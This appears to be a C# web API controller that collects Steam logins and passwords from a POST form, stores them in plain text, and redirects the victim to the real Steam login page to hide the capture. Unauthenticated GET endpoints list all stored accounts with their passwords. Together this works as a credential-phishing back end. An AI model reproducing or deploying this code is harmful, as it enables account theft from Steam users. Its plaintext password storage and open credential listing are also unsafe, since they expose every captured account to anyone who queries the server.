using HttpServer2.Attributes;
using HttpServer2.Models;
using System.Data.SqlClient;
using System.Net;

namespace HttpServer2.Controllers
{
    [ApiController]
    public class Accounts
    {
        [HttpGet("/")]
        public IEnumerable<Account> GetAccounts()
        {
            return new MyORM(Constants.SteamDBConnectionString).Select<Account>();
        }

        [HttpGet("/{id}")]
        public Account? GetAccountById(int id)
        {
            return new MyORM(Constants.SteamDBConnectionString)
                .Select<Account>()
                .Where(x => x.Id == id)
                .FirstOrDefault();
        }

        [HttpPost("/")]
        public void PostAccounts(string login, string password, HttpListenerResponse response)
        {
            new MyORM(Constants.SteamDBConnectionString)
                .Insert(new Account { Login = login, Password = password });

            response.Redirect("https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header");
        }
    }
}
